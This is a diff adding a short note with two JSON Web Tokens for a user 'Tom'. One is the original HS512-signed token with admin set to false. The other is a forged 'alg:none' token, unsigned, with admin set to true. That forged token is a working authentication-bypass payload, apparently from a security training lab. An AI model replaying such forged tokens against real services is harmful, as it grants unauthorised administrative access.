@@ -1,0 +1,5 @@
+Original Tom token:
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3ODM5Mjk2NzIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.st6q6gK49VMz2V9WZVXu_DbE7qljczIUY5O5FkE24FBOKAVPGpYe4N171tUh6T5ULZGP4T_Y9bAlra39G20UqQ
+
+Manipulated alg:none token:
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE3ODM5Mjk2NzIsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
